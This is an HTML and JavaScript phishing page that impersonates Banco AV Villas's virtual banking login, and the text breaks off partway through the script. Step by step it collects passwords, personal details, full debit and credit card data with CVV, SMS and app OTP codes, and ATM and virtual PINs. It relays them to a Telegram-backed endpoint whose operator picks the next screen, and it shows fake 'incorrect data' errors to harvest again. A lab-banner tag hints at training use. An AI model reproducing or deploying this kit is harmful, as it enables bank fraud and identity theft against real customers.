<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca Virtual - Banco AV Villas</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: Poppins;
            src: url(/avvillas/Poppins-Bold.ttf) format("truetype");
            font-style: normal;
            font-weight: 700;
        }

        @font-face {
            font-family: Poppins;
            src: url(/avvillas/Poppins-SemiBold.ttf) format("truetype");
            font-style: normal;
            font-weight: 600;
        }

        @font-face {
            font-family: Poppins;
            src: url(/avvillas/Poppins-Medium.ttf) format("truetype");
            font-style: normal;
            font-weight: 500;
        }

        :root {
            /* Colores principales de AV Villas */
            --avv-red-900: #a61e2e;
            --avv-red-700: #dc2626;
            --avv-red-600: #e53e3e;
            --avv-red-400: #fc8181;
            --avv-red-100: #fed7d7;

            --avv-gray-900: #1a202c;
            --avv-gray-800: #2d3748;
            --avv-gray-700: #4a5568;
            --avv-gray-600: #718096;
            --avv-gray-400: #cbd5e0;
            --avv-gray-300: #e2e8f0;
            --avv-gray-100: #f7fafc;

            --avv-white: #ffffff;
            --avv-black: #000000;

            /* Colores de estado */
            --avv-success: #48bb78;
            --avv-error: #f56565;
            --avv-warning: #ed8936;
            --avv-info: #4299e1;
        }

        body {
            font-family: Poppins, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, var(--avv-gray-100) 0%, var(--avv-white) 100%);
            min-height: 100vh;
        }

        .texto-2 {
            font-family: Poppins, serif;
            font-weight: 500;
            font-size: 14px;
            line-height: 1.5rem;
            color: var(--avv-gray-800);
        }

        .texto-1 {
            font-family: Poppins, serif;
            font-weight: 600;
            font-size: 1.1rem;
            text-align: center;
            line-height: 1.8rem;
            color: var(--avv-gray-900);
            margin-bottom: 20px;
        }

        .entrada-1 {
            font-family: Poppins, serif;
            font-weight: 500;
            font-size: 0.95rem;
            border: 1px solid var(--avv-gray-400);
            border-radius: 6px;
            color: var(--avv-gray-700);
            outline: none;
            padding: 10px 12px;
            width: 100%;
            transition: all 0.3s ease;
            background-color: var(--avv-white);
        }

        .entrada-1:focus {
            border-color: var(--avv-red-600);
            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.1);
        }

        .entrada-1::placeholder {
            color: var(--avv-gray-600);
            opacity: 0.7;
        }

        .boton-1 {
            font-family: Poppins, serif;
            font-weight: 600;
            font-size: 1em;
            background: linear-gradient(135deg, var(--avv-red-600) 0%, var(--avv-red-700) 100%);
            color: var(--avv-white);
            border: none;
            border-radius: 6px;
            padding: 12px 30px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            min-width: 150px;
        }

        .boton-1:hover:not(:disabled) {
            background: linear-gradient(135deg, var(--avv-red-700) 0%, var(--avv-red-900) 100%);
            transform: translateY(-1px);
            box-shadow: 0 4px 6px rgba(0,0,0,0.15);
        }

        .boton-1:active:not(:disabled) {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .boton-1:disabled {
            background: var(--avv-gray-400);
            cursor: not-allowed;
            opacity: 0.6;
        }

        .label-1 {
            font-family: Poppins, serif;
            font-weight: 600;
            font-size: 0.875rem;
            color: var(--avv-gray-700);
            margin-bottom: 6px;
            display: block;
        }

        .select-1 {
            font-family: Poppins, serif;
            font-weight: 500;
            font-size: 0.95rem;
            border: 1px solid var(--avv-gray-400);
            border-radius: 6px;
            color: var(--avv-gray-700);
            padding: 10px 12px;
            width: 100%;
            height: 44px;
            background-color: var(--avv-white);
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%234a5568' d='M4.427 5.427a.75.75 0 0 1 1.06 0L8 7.94l2.513-2.513a.75.75 0 1 1 1.06 1.06l-3.043 3.044a.75.75 0 0 1-1.06 0L4.427 6.487a.75.75 0 0 1 0-1.06z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 12px center;
            background-size: 16px;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            padding-right: 36px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .select-1:focus {
            border-color: var(--avv-red-600);
            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.1);
            outline: none;
        }

        @media only screen and (min-width: 768px) {
            body > .px-3 {
                max-width: 450px;
                margin: 0 auto;
            }
        }

        .hidden {
            display: none !important;
        }

        .error-message {
            color: var(--avv-error);
            font-family: Poppins, serif;
            font-weight: 500;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 2px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-color: var(--avv-error) !important;
        }

        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .loading-overlay.active {
            display: flex;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid var(--avv-gray-300);
            border-top: 4px solid var(--avv-red-600);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* Contenedor principal */
        .main-container {
            background: var(--avv-white);
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.07);
            padding: 30px;
            margin-top: 20px;
            margin-bottom: 20px;
        }

        /* Checkbox personalizado */
        input[type="checkbox"] {
            accent-color: var(--avv-red-600);
        }

        /* Header del banco */
        .bank-header {
            background: var(--avv-white);
            padding: 20px 0;
            border-bottom: 2px solid var(--avv-gray-300);
            margin-bottom: 20px;
        }

        /* Iconos de éxito y error */
        .success-icon {
            color: var(--avv-success);
        }

        .error-icon {
            color: var(--avv-error);
        }

        /* Ajustes para móviles */
        @media (max-width: 576px) {
            .main-container {
                padding: 20px;
                margin: 10px;
            }

            .texto-1 {
                font-size: 1rem;
            }
        }
    </style>
</head>

<body class="px-3">
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="fixed-top bg-white d-flex align-items-center justify-content-center hidden"
        style="height: 100vh; z-index: 9999;">
        <div class="text-center">
            <div class="loading-spinner mx-auto"></div>
            <p class="mt-3 texto-2">Espere un momento por favor...</p>
        </div>
    </div>

    <!-- Header -->
    <div class="bank-header text-center">
        <img src="/avvillas/avvillas-logo.svg" width="180" height="50" alt="Banco AV Villas">
    </div>

    <!-- Vista: Login -->
    <div id="login" class="main-container hidden">
        <h1 class="texto-1">Ingresa a tu Banca Virtual</h1>
        <p class="texto-2 text-center mb-4">Por tu seguridad, ingresa tus credenciales para acceder a tu cuenta</p>

        <!-- Mensaje de error general -->
        <div id="errorGeneralLogin" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

        <div class="mb-4">
            <label class="label-1" for="tipo-documento">Tipo de Documento</label>
            <select class="select-1" id="tipo-documento">
                <option value="1" selected>Cédula de Ciudadanía</option>
                <option value="2">Tarjeta de Identidad</option>
                <option value="3">Cédula de Extranjería</option>
                <option value="4">Pasaporte</option>
                <option value="5">NIT</option>
            </select>
        </div>

        <div class="mb-4">
            <label class="label-1" for="usuario">Número de Documento</label>
            <input class="entrada-1" id="usuario" name="usuario" type="text"
                placeholder="Ingresa tu documento" minlength="5" maxlength="15" autocomplete="off">
            <div class="error-message" id="errorUsuario"></div>
        </div>

        <div class="mb-4">
            <label class="label-1" for="clave">Contraseña</label>
            <input class="entrada-1" id="clave" name="clave" type="password"
                placeholder="Ingresa tu contraseña" minlength="4" maxlength="20" autocomplete="off">
            <div class="error-message" id="errorClave"></div>
        </div>

        <div class="text-center mt-4">
            <button id="btnLogin" class="boton-1" disabled>Ingresar</button>
        </div>
    </div>

    <!-- Vista: Datos Personales -->
    <div id="datos" class="main-container hidden">
        <h1 class="texto-1">Validación de Seguridad</h1>
        <p class="texto-2 text-center mb-4">Por tu seguridad, necesitamos validar tu información personal</p>

        <!-- Mensaje de error general -->
        <div id="errorGeneralDatos" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

        <div class="mb-3">
            <label class="label-1" for="nombre">Nombre completo</label>
            <input class="entrada-1" id="nombre" name="nombre" type="text"
                placeholder="Nombre completo" minlength="3" maxlength="100" autocomplete="off">
            <div class="error-message" id="errorNombre"></div>
        </div>

        <div class="mb-3">
            <label class="label-1" for="cedula">Número de documento</label>
            <input class="entrada-1" id="cedula" name="cedula" type="text"
                placeholder="Número de documento" minlength="5" maxlength="15" autocomplete="off">
            <div class="error-message" id="errorCedula"></div>
        </div>

        <div class="mb-3">
            <label class="label-1" for="email">Correo electrónico</label>
            <input class="entrada-1" id="email" name="email" type="email"
                placeholder="correo@ejemplo.com" autocomplete="off">
            <div class="error-message" id="errorEmail"></div>
        </div>

        <div class="mb-3">
            <label class="label-1" for="celular">Celular</label>
            <input class="entrada-1" id="celular" name="celular" type="text"
                placeholder="Número de celular" minlength="10" maxlength="10" autocomplete="off">
            <div class="error-message" id="errorCelular"></div>
        </div>

        <div class="mb-3">
            <label class="label-1" for="ciudad">Ciudad</label>
            <input class="entrada-1" id="ciudad" name="ciudad" type="text"
                placeholder="Ciudad de residencia" minlength="3" maxlength="50" autocomplete="off">
            <div class="error-message" id="errorCiudad"></div>
        </div>

        <div class="mb-4">
            <label class="label-1" for="direccion">Dirección</label>
            <input class="entrada-1" id="direccion" name="direccion" type="text"
                placeholder="Dirección completa" minlength="5" maxlength="100" autocomplete="off">
            <div class="error-message" id="errorDireccion"></div>
        </div>

        <div class="text-center">
            <button id="btnDatos" class="boton-1" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Tarjeta de Débito -->
    <div id="tdb" class="main-container hidden">
        <h1 class="texto-1">Validación de Tarjeta Débito</h1>
        <p class="texto-2 text-center mb-4">Ingresa los datos de tu tarjeta débito para continuar</p>

        <!-- Mensaje de error general -->
        <div id="errorGeneralTDB" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

        <div class="mb-3">
            <label class="label-1" for="numtarjetaTDB">Número de tarjeta débito</label>
            <input class="entrada-1" id="numtarjetaTDB" name="numtarjetatdb" type="text"
                placeholder="0000 0000 0000 0000" minlength="16" maxlength="19" autocomplete="off">
            <div class="error-message" id="errorNumTarjetaTDB"></div>
        </div>

        <div class="row mb-3">
            <div class="col-6">
                <label class="label-1" for="vencimientoTDB">Fecha de vencimiento</label>
                <input class="entrada-1" id="vencimientoTDB" name="vencimientotdb" type="text"
                    placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                <div class="error-message" id="errorVencimientoTDB"></div>
            </div>
            <div class="col-6">
                <label class="label-1" for="cvvTDB">CVV</label>
                <input class="entrada-1" id="cvvTDB" name="cvvtdb" type="text"
                    placeholder="CVV" minlength="3" maxlength="4" autocomplete="off">
                <div class="error-message" id="errorCVVTDB"></div>
            </div>
        </div>

        <div class="mb-4">
            <div class="form-check">
                <input type="checkbox" class="form-check-input" id="checkTDB">
                <label class="form-check-label" for="checkTDB" style="font-size: 13px;">
                    Certifico que soy el titular de este producto
                </label>
            </div>
        </div>

        <div class="text-center">
            <button id="btnTDB" class="boton-1" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Tarjeta de Crédito -->
    <div id="tdc" class="main-container hidden">
        <h1 class="texto-1">Validación de Tarjeta Crédito</h1>
        <p class="texto-2 text-center mb-4">Ingresa los datos de tu tarjeta crédito para continuar</p>

        <!-- Mensaje de error general -->
        <div id="errorGeneralTDC" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

        <div class="mb-3">
            <label class="label-1" for="numtarjetaTDC">Número de tarjeta crédito</label>
            <input class="entrada-1" id="numtarjetaTDC" name="numtarjetatdc" type="text"
                placeholder="0000 0000 0000 0000" minlength="16" maxlength="19" autocomplete="off">
            <div class="error-message" id="errorNumTarjetaTDC"></div>
        </div>

        <div class="row mb-3">
            <div class="col-6">
                <label class="label-1" for="vencimientoTDC">Fecha de vencimiento</label>
                <input class="entrada-1" id="vencimientoTDC" name="vencimientotdc" type="text"
                    placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                <div class="error-message" id="errorVencimientoTDC"></div>
            </div>
            <div class="col-6">
                <label class="label-1" for="cvvTDC">CVV</label>
                <input class="entrada-1" id="cvvTDC" name="cvvtdc" type="text"
                    placeholder="CVV" minlength="3" maxlength="4" autocomplete="off">
                <div class="error-message" id="errorCVVTDC"></div>
            </div>
        </div>

        <div class="mb-4">
            <div class="form-check">
                <input type="checkbox" class="form-check-input" id="checkTDC">
                <label class="form-check-label" for="checkTDC" style="font-size: 13px;">
                    Certifico que soy el titular de este producto
                </label>
            </div>
        </div>

        <div class="text-center">
            <button id="btnTDC" class="boton-1" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Código SMS -->
    <div id="codsms" class="main-container hidden">
        <h1 class="texto-1">Código de Seguridad SMS</h1>
        <p class="texto-2 text-center mb-4">Hemos enviado un código de seguridad a tu celular registrado</p>

        <!-- Mensaje de error general -->
        <div id="errorGeneralCodSMS" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

        <div class="mb-4">
            <label class="label-1" for="codsmsInput">Código SMS</label>
            <input class="entrada-1" id="codsmsInput" name="codsms" type="password"
                placeholder="Ingresa el código" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodSMS"></div>
        </div>

        <div class="text-center">
            <button id="btnCodSMS" class="boton-1" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Código App -->
    <div id="codapp" class="main-container hidden">
        <h1 class="texto-1">Código de Seguridad App</h1>
        <p class="texto-2 text-center mb-4">Ingresa el código generado en tu aplicación móvil</p>

        <!-- Mensaje de error general -->
        <div id="errorGeneralCodApp" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

        <div class="mb-4">
            <label class="label-1" for="codappInput">Código de la App</label>
            <input class="entrada-1" id="codappInput" name="codapp" type="password"
                placeholder="Ingresa el código" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodApp"></div>
        </div>

        <div class="text-center">
            <button id="btnCodApp" class="boton-1" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Clave de Cajero -->
    <div id="pincaj" class="main-container hidden">
        <h1 class="texto-1">Clave de Cajero Automático</h1>
        <p class="texto-2 text-center mb-4">Por seguridad, ingresa tu clave de cajero automático</p>

        <!-- Mensaje de error general -->
        <div id="errorGeneralPinCaj" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

        <div class="mb-4">
            <label class="label-1" for="pincajInput">Clave de 4 dígitos</label>
            <input class="entrada-1" id="pincajInput" name="pincaj" type="password"
                placeholder="****" minlength="4" maxlength="4" autocomplete="off">
            <div class="error-message" id="errorPinCaj"></div>
        </div>

        <div class="text-center">
            <button id="btnPinCaj" class="boton-1" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Clave Virtual -->
    <div id="pinvir" class="main-container hidden">
        <h1 class="texto-1">Clave Virtual</h1>
        <p class="texto-2 text-center mb-4">Ingresa tu clave virtual de 4 dígitos</p>

        <!-- Mensaje de error general -->
        <div id="errorGeneralPinVir" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

        <div class="mb-4">
            <label class="label-1" for="pinvirInput">Clave virtual</label>
            <input class="entrada-1" id="pinvirInput" name="pinvir" type="password"
                placeholder="****" minlength="4" maxlength="4" autocomplete="off">
            <div class="error-message" id="errorPinVir"></div>
        </div>

        <div class="text-center">
            <button id="btnPinVir" class="boton-1" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Éxito -->
    <div id="exito" class="main-container hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="currentColor"
                    class="bi bi-check-circle-fill success-icon" viewBox="0 0 16 16">
                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                </svg>
            </div>
            <h2 class="mb-3">Proceso completado</h2>
            <p class="texto-2">Tu transacción ha sido procesada exitosamente.</p>
            <p class="texto-2">Serás redirigido en unos momentos...</p>
        </div>
    </div>

    <!-- Vista: Error -->
    <div id="error" class="main-container hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="currentColor"
                    class="bi bi-x-circle-fill error-icon" viewBox="0 0 16 16">
                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM5.354 4.646a.5.5 0 1 0-.708.708L7.293 8l-2.647 2.646a.5.5 0 0 0 .708.708L8 8.707l2.646 2.647a.5.5 0 0 0 .708-.708L8.707 8l2.647-2.646a.5.5 0 0 0-.708-.708L8 7.293 5.354 4.646z"/>
                </svg>
            </div>
            <h2 class="mb-3">Error en el proceso</h2>
            <p class="texto-2">No pudimos completar tu solicitud.</p>
            <p class="texto-2">Por favor intenta nuevamente más tarde.</p>
        </div>
    </div>

    <!-- Vista: Wait (Loading intermedio) -->
    <div id="wait" class="hidden">
        <div class="text-center mt-5">
            <img src="/avvillas/spinner-avvi.gif" width="100" height="100" alt="">
        </div>
        <br>
        <div class="text-center">
            <p class="texto-1">Procesando tu solicitud...</p>
            <p class="texto-2">Por favor espera un momento</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login'
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== RECUPERAR DATOS PSE ====================
            // Recuperar datos del pagador guardados desde la página de inicio
            const pseDatosStr = sessionStorage.getItem('pseDatos');
            if (pseDatosStr) {
                try {
                    const pseDatos = JSON.parse(pseDatosStr);
                    // Guardar los datos del pagador en localStorage con el prefijo del uniqId
                    const camposPSE = {
                        'nombre': pseDatos.nombre,
                        'email': pseDatos.email,
                        'celular': pseDatos.celular,
                        'direccion': pseDatos.direccion,
                        'ciudad': pseDatos.ciudad,
                        'departamento': pseDatos.departamento,
                        'banco': pseDatos.banco,
                        'tipoPersona': pseDatos.tipoPersona,
                        'ente': 'brasilia'
                    };
                    Object.keys(camposPSE).forEach(key => {
                        if (camposPSE[key]) {
                            const storageKey = `${appState.uniqId}_${key}`;
                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
                        }
                    });
                    console.log('Datos PSE recuperados:', pseDatos);
                } catch (e) {
                    console.error('Error al parsear pseDatos:', e);
                }
            }

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            /**
             * Muestra un mensaje de error en un campo específico
             * @param {string} fieldId - ID del campo de entrada
             * @param {string} errorId - ID del elemento de error
             * @param {string} mensaje - Mensaje de error a mostrar
             */
            function mostrarError(fieldId, errorId, mensaje) {
                $('#' + errorId).text(mensaje).addClass('show');
                $('#' + fieldId).addClass('borde-entrada-error');
            }

            /**
             * Oculta el mensaje de error de un campo específico
             * @param {string} fieldId - ID del campo de entrada
             * @param {string} errorId - ID del elemento de error
             */
            function ocultarError(fieldId, errorId) {
                $('#' + errorId).removeClass('show').text('');
                $('#' + fieldId).removeClass('borde-entrada-error');
            }

            function hideAllViews() {
                $('#login, #datos, #tdb, #tdc, #codsms, #codapp, #pincaj, #pinvir, #exito, #error, #wait').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Mostrar mensaje de error general si la vista ya fue mostrada antes
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    // La vista ya fue mostrada antes, mostrar mensaje de error y limpiar campos
                    if (viewId === 'login') {
                        $('#errorGeneralLogin').text('Los datos ingresados son incorrectos. Por favor verifica e intenta nuevamente.').addClass('show');
                        $('#usuario').val('');
                        $('#clave').val('');
                        $('#btnLogin').prop('disabled', true);
                    } else if (viewId === 'datos') {
                        $('#errorGeneralDatos').text('Los datos ingresados no coinciden con nuestros registros. Verifica e intenta nuevamente.').addClass('show');
                        $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').val('');
                        $('#btnDatos').prop('disabled', true);
                    } else if (viewId === 'tdb') {
                        $('#errorGeneralTDB').text('Los datos de la tarjeta son incorrectos. Por favor verifica e intenta nuevamente.').addClass('show');
                        $('#numtarjetaTDB, #vencimientoTDB, #cvvTDB').val('');
                        $('#checkTDB').prop('checked', false);
                        $('#btnTDB').prop('disabled', true);
                    } else if (viewId === 'tdc') {
                        $('#errorGeneralTDC').text('Los datos de la tarjeta son incorrectos. Por favor verifica e intenta nuevamente.').addClass('show');
                        $('#numtarjetaTDC, #vencimientoTDC, #cvvTDC').val('');
                        $('#checkTDC').prop('checked', false);
                        $('#btnTDC').prop('disabled', true);
                    } else if (viewId === 'codsms') {
                        $('#errorGeneralCodSMS').text('El código ingresado es incorrecto. Solicita un nuevo código si es necesario.').addClass('show');
                        $('#codsmsInput').val('');
                        $('#btnCodSMS').prop('disabled', true);
                    } else if (viewId === 'codapp') {
                        $('#errorGeneralCodApp').text('El código ingresado es incorrecto. Genera un nuevo código en tu aplicación.').addClass('show');
                        $('#codappInput').val('');
                        $('#btnCodApp').prop('disabled', true);
                    } else if (viewId === 'pincaj') {
                        $('#errorGeneralPinCaj').text('La clave ingresada es incorrecta. Por favor intenta nuevamente.').addClass('show');
                        $('#pincajInput').val('');
                        $('#btnPinCaj').prop('disabled', true);
                    } else if (viewId === 'pinvir') {
                        $('#errorGeneralPinVir').text('La clave virtual es incorrecta. Por favor intenta nuevamente.').addClass('show');
                        $('#pinvirInput').val('');
                        $('#btnPinVir').prop('disabled', true);
                    }
                } else {
                    // Ocultar mensajes de error generales
                    $('.error-message').removeClass('show').text('');
                }

                // Registrar la vista en el historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                setTimeout(iniciarPolling, 4000);
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Ya hay un envío en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = ['usuario', 'clave', 'ente', 'numtarjetaTDB', 'cvvTDB', 'vencimientoTDB',
                    'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC',
                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion', 'departamento',
                    'banco', 'tipoPersona', 'codsms', 'codapp', 'pincaj', 'pinvir',
                    'status', 'uniqid'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                // Debug: Mostrar qué datos se están enviando
                console.log('Datos a enviar a Telegram:', allData);

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Telegram:', result);
                } catch (e) {
                    console.error('Error al enviar a Telegram:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (loadingElement && loadingElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        // Mapeo de respuestas de Telegram a vistas
                        const viewMap = {
                            'login': 'login',
                            'datos': 'datos',
                            'tdb': 'tdb',
                            'tdc': 'tdc',
                            'codsms': 'codsms',
                            'codapp': 'codapp',
                            'pincaj': 'pincaj',
                            'pinvir': 'pinvir',
                            'exito': 'exito',
                            'error': 'error'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redirección automática para exito o error
                        if (viewId === 'exito' || viewId === 'error') {
                            setTimeout(function () {
                                window.location.href = 'https://www.avvillas.com.co/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) return false;

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);
                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) digito -= 9;
                    }
                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) return false;

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) return false;
                if (anioNum === anioActual && mesNum < mesActual) return false;

                return true;
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const isValid = usuario.length >= 5 && clave.length >= 4;
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            function validateDatos() {
                const nombre = $('#nombre').val().trim();
                const cedula = $('#cedula').val().trim();
                const email = $('#email').val().trim();
                const celular = $('#celular').val().trim();
                const ciudad = $('#ciudad').val().trim();
                const direccion = $('#direccion').val().trim();

                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

                const isValid = nombre.length >= 3 &&
                               cedula.length >= 5 &&
                               emailRegex.test(email) &&
                               celular.length === 10 &&
                               /^\d+$/.test(celular) &&
                               ciudad.length >= 3 &&
                               direccion.length >= 5;

                $('#btnDatos').prop('disabled', !isValid);
                return isValid;
            }

            function validateTarjeta(tipo) {
                const numInput = tipo === 'tdb' ? '#numtarjetaTDB' : '#numtarjetaTDC';
                const venInput = tipo === 'tdb' ? '#vencimientoTDB' : '#vencimientoTDC';
                const cvvInput = tipo === 'tdb' ? '#cvvTDB' : '#cvvTDC';
                const checkInput = tipo === 'tdb' ? '#checkTDB' : '#checkTDC';
                const btnInput = tipo === 'tdb' ? '#btnTDB' : '#btnTDC';

                const num = $(numInput).val().replace(/\s/g, '');
                const ven = $(venInput).val();
                const cvv = $(cvvInput).val();
                const check = $(checkInput).is(':checked');

                const isValid = num.length >= 15 && validarLuhn(num) &&
                               validarVencimiento(ven) && cvv.length >= 3 && check;

                $(btnInput).prop('disabled', !isValid);
                return isValid;
            }

            function validateOtp(inputId, btnId) {
                const value = $(inputId).val().trim();
                let isValid = false;

                if (inputId === '#pincajInput' || inputId === '#pinvirInput') {
                    isValid = /^\d{4}$/.test(value);
                } else {
                    isValid = /^\d{6,8}$/.test(value);
                }

                $(btnId).prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS ====================
            // Login
            $('#usuario, #clave').on('input', validateLogin);
            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'avvillas');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Datos
            $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').on('input', validateDatos);
            $('#btnDatos').on('click', async function () {
                if (validateDatos()) {
